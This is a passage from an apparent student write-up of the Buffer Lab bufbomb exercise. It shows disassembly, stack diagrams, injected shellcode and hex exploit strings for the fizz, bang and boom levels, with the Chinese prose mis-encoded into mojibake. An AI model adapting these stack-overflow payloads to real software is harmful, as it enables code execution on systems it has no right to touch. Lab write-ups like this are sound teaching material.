class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">disas</span> fizz<br><br><span class="hljs-attribute">08048c42</span> &lt;fizz&gt;:<br> <span class="hljs-attribute">8048c42</span>:<span class="hljs-number">55</span>                   push   %ebp<br> <span class="hljs-attribute">8048c43</span>:<span class="hljs-number">89</span> e<span class="hljs-number">5</span>                mov    %esp,%ebp<br> <span class="hljs-attribute">8048c45</span>:<span class="hljs-number">83</span> ec <span class="hljs-number">18</span>             sub    $<span class="hljs-number">0</span>x<span class="hljs-number">18</span>,%esp<br> <span class="hljs-attribute">8048c48</span>:<span class="hljs-number">8</span>b <span class="hljs-number">45</span> <span class="hljs-number">08</span>             mov    <span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%ebp),%eax<br> <span class="hljs-attribute">8048c4b</span>:<span class="hljs-number">3</span>b <span class="hljs-number">05</span> <span class="hljs-number">08</span> d<span class="hljs-number">1</span> <span class="hljs-number">04</span> <span class="hljs-number">08</span>    cmp    <span class="hljs-number">0</span>x<span class="hljs-number">804</span>d<span class="hljs-number">108</span>,%eax<br> <span class="hljs-attribute">8048c51</span>:<span class="hljs-number">75</span> <span class="hljs-number">26</span>                jne    <span class="hljs-number">8048</span>c<span class="hljs-number">79</span> &lt;fizz+<span class="hljs-number">0</span>x<span class="hljs-number">37</span>&gt;<br> <span class="hljs-attribute">8048c53</span>:<span class="hljs-number">89</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>          mov    %eax,<span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%esp)<br> <span class="hljs-attribute">8048c57</span>:c<span class="hljs-number">7</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">04</span> ee a<span class="hljs-number">4</span> <span class="hljs-number">04</span> movl   $<span class="hljs-number">0</span>x<span class="hljs-number">804</span>a<span class="hljs-number">4</span>ee,<span class="hljs-number">0</span>x<span class="hljs-number">4</span>(%esp)<br> <span class="hljs-attribute">8048c5e</span>:<span class="hljs-number">08</span> <br> <span class="hljs-attribute">8048c5f</span>:c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> movl   $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,(%esp)<br> <span class="hljs-attribute">8048c66</span>:e<span class="hljs-number">8</span> <span class="hljs-number">55</span> fd ff ff       call   <span class="hljs-number">80489</span>c<span class="hljs-number">0</span> &lt;__printf_chk@plt&gt;<br> <span class="hljs-attribute">8048c6b</span>:c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> movl   $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,(%esp)<br> <span class="hljs-attribute">8048c72</span>:e<span class="hljs-number">8</span> <span class="hljs-number">04</span> <span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       call   <span class="hljs-number">804937</span>b &lt;validate&gt;<br> <span class="hljs-attribute">8048c77</span>:eb <span class="hljs-number">18</span>                jmp    <span class="hljs-number">8048</span>c<span class="hljs-number">91</span> &lt;fizz+<span class="hljs-number">0</span>x<span class="hljs-number">4</span>f&gt;<br> <span class="hljs-attribute">8048c79</span>:<span class="hljs-number">89</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>          mov    %eax,<span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%esp)<br> <span class="hljs-attribute">8048c7d</span>:c<span class="hljs-number">7</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">04</span> <span class="hljs-number">40</span> a<span class="hljs-number">3</span> <span class="hljs-number">04</span> movl   $<span class="hljs-number">0</span>x<span class="hljs-number">804</span>a<span class="hljs-number">340</span>,<span class="hljs-number">0</span>x<span class="hljs-number">4</span>(%esp)<br> <span class="hljs-attribute">8048c84</span>:<span class="hljs-number">08</span> <br> <span class="hljs-attribute">8048c85</span>:c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> movl   $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,(%esp)<br> <span class="hljs-attribute">8048c8c</span>:e<span class="hljs-number">8</span> <span class="hljs-number">2</span>f fd ff ff       call   <span class="hljs-number">80489</span>c<span class="hljs-number">0</span> &lt;__printf_chk@plt&gt;<br> <span class="hljs-attribute">8048c91</span>:c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> movl   $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,(%esp)<br> <span class="hljs-attribute">8048c98</span>:e<span class="hljs-number">8</span> <span class="hljs-number">63</span> fc ff ff       call   <span class="hljs-number">8048900</span> &lt;exit@plt&gt;<br></code></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆreturn addrå’Œå‚æ•°ä¹‹é—´éœ€è¦å¡«å……å››ä¸ªå­—èŠ‚ï¼Ÿè¿™æ¶‰åŠåˆ°æ ˆå›æ”¶æ—¶å€™çš„æ“ä½œï¼š</p><ul><li>mov %ebpï¼Œ%esp ã€‚å°†espæŒ‡å‘ebpæ‰€æŒ‡ï¼Œç›¸å½“äºå›æ”¶æ ˆåˆ†é…çš„ç©ºé—´</li><li>pop ebpã€‚æ¢å¤å‰æ ˆæŒ‡é’ˆï¼ŒåŒæ—¶esp=esp+4ï¼Œä¹Ÿå³æ˜¯æŒ‡å‘è¿”å›åœ°å€ã€‚ä¸Šé¢movå’Œpopè¯­å¥å¯ä»¥ç”¨ä¸€ä¸ªleaveä»£æ›¿</li><li>retæŒ‡ä»¤ç›¸å½“äºpop eipï¼Œå› æ­¤esp=esp+4ï¼Œä¹Ÿå³æ˜¯æŒ‡å‘è¿”å›åœ°å€+4å¤„ã€‚å› æ­¤ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯åœ¨return addr+8çš„ä½ç½®</li></ul><p>è¦æ³¨æ„åˆ°pushå’ŒpopæŒ‡ä»¤éƒ½éšå«ç€espçš„æ”¹å˜</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">--------------------------------------------------------------<br><br>`mov %ebpï¼Œ%esp`<br><br>     high         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>                  â”‚           â”‚<br>                  â”‚   cookie  â”‚<br>                  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>                  â”‚           â”‚<br>                  â”‚           â”‚<br>                  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>                  â”‚           â”‚<br>                  â”‚<span class="hljs-keyword">return</span> addrâ”‚<br>                  â”‚           â”‚<br>                  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>esp  ebp  â”€â”€â”€â–º <br>---------------------------------------------------------------<br><br>`pop ebp`<br><br><br>    ebp  â”€â”€â”€â–º<br><br>                  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>                  â”‚           â”‚<br>                  â”‚   cookie  â”‚<br>                  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>                  â”‚           â”‚<br>                  â”‚           â”‚                  <br>                  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>                  â”‚           â”‚<br>    esp  â”€â”€â”€â–º     â”‚<span class="hljs-keyword">return</span> addrâ”‚<br>                  â”‚           â”‚<br>                  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br><br>---------------------------------------------------------------<br>`ret` ä¹Ÿå³æ˜¯ `pop eip`<br>  <br>    ebp  â”€â”€â”€â–º<br><br>                  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>                  â”‚           â”‚<br>                  â”‚   cookie  â”‚<br>                  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>                  â”‚           â”‚<br>    esp  â”€â”€â”€â–º     â”‚           â”‚                  <br>                  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>                  â”‚           â”‚<br>    eip  â”€â”€â”€â–º     â”‚<span class="hljs-keyword">return</span> addrâ”‚<br>                  â”‚           â”‚<br>                  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br><br><br><br>```                <br><br>exploit.txt<br><br></code></pre></td></tr></table></figure><p>00 00 00 00<br>00 00 00 00<br>00 00 00 00<br>00 00 00 00<br>00 00 00 00<br>00 00 00 00<br>00 00 00 00<br>00 00 00 00<br>00 00 00 00<br>00 00 00 00<br>00 00 00 00<br>42 8c 04 08 /* è¿”å›åœ°å€ï¼Œå°ç«¯åº <em>/<br>00 00 00 00 /</em> è§å‰é¢åˆ†æ <em>/<br>0e 56 85 61 /</em> cookieï¼Œä¹Ÿå³æ˜¯fizzå‡½æ•°çš„å‚æ•° */</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><br>è¾“å‡º<br><br>```<span class="hljs-built_in">shell</span><br>Userid: nmsl<br>Cookie: <span class="hljs-number">0x6185560e</span><br><span class="hljs-built_in">Type</span> <span class="hljs-keyword">string</span>:Fizz!: You called <span class="hljs-built_in">fizz</span>(<span class="hljs-number">0x6185560e</span>)<br>VALID<br>NICE JOB!<br></code></pre></td></tr></table></figure><h1 id="level-2-Firecracker-15-pts"><a href="#level-2-Firecracker-15-pts" class="headerlink" title="level 2 Firecracker(15 pts)"></a>level 2 Firecracker(15 pts)</h1><p>è¿™ä¸€æ¬¡æˆ‘ä»¬éœ€è¦è°ƒç”¨å‡½æ•°bangï¼Œç”±äºbangä¸­ä¼šéªŒè¯å…¨å±€å˜é‡global_valueæ˜¯å¦ç­‰äºcookieï¼Œå› æ­¤éœ€è¦åœ¨å †æ ˆä¸­æ³¨å…¥ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> global_value = <span class="hljs-number">0</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">bang</span><span class="hljs-params">(<span class="hljs-keyword">int</span> val)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (global_value == cookie) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Bang!: You set global_value to 0x%x\n&quot;</span>, global_value);<br>        validate(<span class="hljs-number">2</span>);<br>    &#125; <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Misfire: global_value = 0x%x\n&quot;</span>, global_value);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>å°†è¿”å›åœ°å€ä¿®æ”¹ä¸ºbuf[0]çš„åœ°å€80491CCï¼Œgetbufå‡½æ•°å°†ä¼šè·³åˆ°buf[0]ï¼Œç„¶åæ‰§è¡Œæ­¤å¤„çš„ä»£ç </p></li><li><p>æ³¨å…¥ä»£ç ï¼š</p><ul><li>ä¿®æ”¹global_valueçš„å€¼ä¸ºcookie</li><li>å°†bangå‡½æ•°çš„åœ°å€å‹å…¥æ ˆï¼Œåè·Ÿä¸€ä¸ªretæŒ‡ä»¤</li></ul></li><li><p>åæ±‡ç¼–å¾—åˆ°bangçš„åœ°å€ä¸º0x08048c9d</p></li><li><p>global_valueçš„åœ°å€ä¸º0x804d100</p></li><li><p>Userid: nmsl Cookie: 0x6185560e</p></li></ul><p>éœ€è¦æ³¨å…¥çš„ä»£ç ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">movl</span>  $<span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e,%eax<br><span class="hljs-attribute">movl</span> %eax,<span class="hljs-number">0</span>x<span class="hljs-number">804</span>d<span class="hljs-number">100</span>     //å°†æ­£ç¡®çš„cookieèµ‹ç»™global_value<br><span class="hljs-attribute">push</span> $<span class="hljs-number">0</span>x<span class="hljs-number">08048</span>c<span class="hljs-number">9</span>d        //bangçš„åœ°å€å‹æ ˆ<br><span class="hljs-attribute">ret</span>                     //ç­‰åŒäº pop eipï¼Œè·³è½¬åˆ°bangå¹¶æ‰§è¡Œ<br></code></pre></td></tr></table></figure><p>æ±‡ç¼–<code> gcc -m32 -c 1.s</code></p><p>å†ä½¿ç”¨objdumpåæ±‡ç¼–å¾—åˆ°äºŒè¿›åˆ¶ä»£ç </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Disassembly</span> of section .text:<br><br><span class="hljs-attribute">00000000</span> &lt;.text&gt;:<br>   <span class="hljs-attribute">0</span>:   b<span class="hljs-number">8</span> <span class="hljs-number">0</span>e <span class="hljs-number">56</span> <span class="hljs-number">85</span> <span class="hljs-number">61</span>          mov    $<span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e,%eax<br>   <span class="hljs-attribute">5</span>:   a<span class="hljs-number">3</span> <span class="hljs-number">00</span> d<span class="hljs-number">1</span> <span class="hljs-number">04</span> <span class="hljs-number">08</span>          mov    %eax,<span class="hljs-number">0</span>x<span class="hljs-number">804</span>d<span class="hljs-number">100</span><br>   <span class="hljs-attribute">a</span>:   ff <span class="hljs-number">35</span> <span class="hljs-number">9</span>d <span class="hljs-number">8</span>c <span class="hljs-number">04</span> <span class="hljs-number">08</span>       pushl  <span class="hljs-number">0</span>x<span class="hljs-number">8048</span>c<span class="hljs-number">9</span>d<br>  <span class="hljs-attribute">10</span>:   c<span class="hljs-number">3</span>                      ret    <br></code></pre></td></tr></table></figure><p>exploit.txt</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">b8</span> <span class="hljs-number">0</span>e <span class="hljs-number">56</span> <span class="hljs-number">85</span> <span class="hljs-number">61</span><br><span class="hljs-attribute">a3</span> <span class="hljs-number">00</span> d<span class="hljs-number">1</span> <span class="hljs-number">04</span> <span class="hljs-number">08</span><br><span class="hljs-attribute">68</span> <span class="hljs-number">9</span>d <span class="hljs-number">8</span>c <span class="hljs-number">04</span> <span class="hljs-number">08</span><br><span class="hljs-attribute">c3</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">28</span> <span class="hljs-number">38</span> <span class="hljs-number">68</span> <span class="hljs-number">55</span> //è¦æ³¨æ„è¿™ä¸ªç¼“å†²åŒºçš„é¦–åœ°å€,buf[<span class="hljs-number">0</span>]åœ¨å †æ ˆæ®µ<br></code></pre></td></tr></table></figure><p>éªŒè¯ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cat</span> exploit.txt | ./hex<span class="hljs-number">2</span>raw  | ./bufbomb -u nmsl<br><br><span class="hljs-attribute">Userid</span>: nmsl<br><span class="hljs-attribute">Cookie</span>: <span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e<br><span class="hljs-attribute">Type</span> string:Bang!: You set global_value to <span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e<br><span class="hljs-attribute">VALID</span><br><span class="hljs-attribute">NICE</span> JOB!<br></code></pre></td></tr></table></figure><h1 id="Level-3-Dynamite-20-pts"><a href="#Level-3-Dynamite-20-pts" class="headerlink" title="Level 3: Dynamite (20 pts)"></a>Level 3: Dynamite (20 pts)</h1><p>ä¹‹å‰çš„ä»£ç æ³¨å…¥ä¼šç ´åå †æ ˆçš„æ ˆå¹³è¡¡ï¼ˆæ¯”å¦‚è¦†ç›–äº†ebpçš„å€¼ï¼‰ï¼Œä½¿å¾—ç¨‹åºå¼‚å¸¸é€€å‡ºï¼Œlevel 3éœ€è¦å°†åœ¨ä¸æ”¹å˜ç¨‹åºæ‰§è¡Œæµçš„æƒ…å†µä¸‹ï¼Œæ”¹å†™getbufå‡½æ•°çš„è¿”å›å€¼ï¼Œå¹¶è¿”å›åˆ°testå‡½æ•°ä¸­ç»§ç»­æ‰§è¡Œ</p><ul><li>è§‚å¯ŸCè¯­è¨€ä»£ç ï¼Œtestå‡½æ•°call getbufå‡½æ•°çš„ä¸‹ä¸€æ¡è¯­å¥æ˜¯ï¼Œ<code>if (local != uniqueval()) &#123;</code>ï¼Œé‚£ä¹ˆè¿™å°±æ˜¯ä»getbufå‡½æ•°è¿”å›åè¦æ‰§è¡Œçš„ä»£ç çš„åœ°å€ã€‚ä¸º<code>0x8048dbe</code></li><li>getbufåŸå…ˆçš„è¿”å›å€¼æ˜¯1ï¼Œç°åœ¨éœ€è¦æ”¹ä¸ºcookieçš„å€¼ï¼ŒæŒ‰ç…§çº¦å®šï¼Œè¿”å›å€¼è¢«ä¿å­˜åœ¨eaxå¯„å­˜å™¨ï¼ˆä¹Ÿå¯ä»¥ä»testå‡½æ•°çš„åæ±‡ç¼–ç»“æœè§‚å¯ŸéªŒè¯ï¼‰</li><li>ebpçš„å€¼ä¸èƒ½è¢«æ”¹å˜ï¼Œå› æ­¤éœ€è¦åŠ¨æ€è°ƒè¯•å¾—åˆ°ebpçš„åŸå§‹å€¼ã€‚ä¸º<code>0x55683880</code></li><li>åŸå…ˆçš„return addréœ€è¦æ”¹ä¸ºGetså‡½æ•°æ‰€è¯»å…¥çš„å­—ç¬¦ä¸²çš„åœ°å€<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><br><br><br><br><br>                       â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>                       â”‚           â”‚<br>                       â”‚<span class="hljs-keyword">return</span> addrâ”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>                       â”‚           â”‚                    â”‚<br>                       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤                    â”‚<br>                       â”‚           â”‚                    â”‚<br>    cant be modifie    â”‚ old ebp   â”‚                    â”‚<br>                       â”‚           â”‚                    â”‚<br>                       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤                    â”‚<br>                       â”‚           â”‚                    â”‚<br>                       â”‚   ....    â”‚                    â”‚<br>                       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤                    â”‚<br>                       â”‚           â”‚                    â”‚<br>                       â”‚  ret      â”‚                    â”‚<br>                       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤                    â”‚<br>                       â”‚  push     â”‚                    â”‚<br>                       â”‚  retadd   â”‚                    â”‚<br>                       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤                    â”‚<br>                       â”‚           â”‚ â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>      buf[<span class="hljs-number">0</span>] addr      â”‚  <span class="hljs-built_in">set</span> eax  â”‚<br>                       â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br><br><br><br> <span class="hljs-keyword">int</span> getbuf()<br> &#123;<br>    <span class="hljs-keyword">char</span> buf[NORMAL_BUFFER_SIZE];<br>    Gets(buf);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br> &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> val;<br>    <span class="hljs-comment">/* Put canary on stack to detect possible corruption */</span><br>    <span class="hljs-keyword">volatile</span> <span class="hljs-keyword">int</span> local = uniqueval();<br><br>    val = getbuf();<br><br>    <span class="hljs-comment">/* Check for corrupted stack */</span><br>    <span class="hljs-keyword">if</span> (local != uniqueval()) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sabotaged!: the stack has been corrupted\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (val == cookie) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Boom!: getbuf returned 0x%x\n&quot;</span>, val);<br>        validate(<span class="hljs-number">3</span>);<br>    &#125; <br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Dud: getbuf returned 0x%x\n&quot;</span>, val);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>æ³¨å…¥ä»£ç <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">movl</span>  $<span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e,%eax<br><span class="hljs-attribute">push</span> $<span class="hljs-number">0</span>x<span class="hljs-number">8048</span>dbe<br><span class="hljs-attribute">ret</span><br></code></pre></td></tr></table></figure>å¯¹åº”çš„äºŒè¿›åˆ¶å­—èŠ‚<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">Disassembly</span> of section .text:<br><br><span class="hljs-attribute">00000000</span> &lt;.text&gt;:<br>   <span class="hljs-attribute">0</span>:   b<span class="hljs-number">8</span> <span class="hljs-number">0</span>e <span class="hljs-number">56</span> <span class="hljs-number">85</span> <span class="hljs-number">61</span>          mov    $<span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e,%eax<br>   <span class="hljs-attribute">5</span>:   <span class="hljs-number">68</span> be <span class="hljs-number">8</span>d <span class="hljs-number">04</span> <span class="hljs-number">08</span>          push   $<span class="hljs-number">0</span>x<span class="hljs-number">8048</span>dbe<br>   <span class="hljs-attribute">a</span>:   c<span class="hljs-number">3</span>                      ret    <br></code></pre></td></tr></table></figure></li></ul><p>exploit.txt</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">b8</span> <span class="hljs-number">0</span>e <span class="hljs-number">56</span> <span class="hljs-number">85</span> <span class="hljs-number">61</span><br><span class="hljs-attribute">68</span> be <span class="hljs-number">8</span>d <span class="hljs-number">04</span> <span class="hljs-number">08</span><br><span class="hljs-attribute">c3</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">80</span> <span class="hljs-number">38</span> <span class="hljs-number">68</span> <span class="hljs-number">55</span><br><span class="hljs-attribute">28</span> <span class="hljs-number">38</span> <span class="hljs-number">68</span> <span class="hljs-number">55</span><br></code></pre></td></tr></table></figure><p>æµ‹è¯•</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cat</span> exploit.txt | ./hex<span class="hljs-number">2</span>raw  | ./bufbomb -u nmsl<br><br><span class="hljs-attribute">Userid</span>: nmsl<br><span class="hljs-attribute">Cookie</span>: <span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e<br><span class="hljs-attribute">Type</span> string:Boom!: getbuf returned <span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e<br><span class="hljs-attribute">VALID</span><br><span class="hljs-attribute">NICE</span> 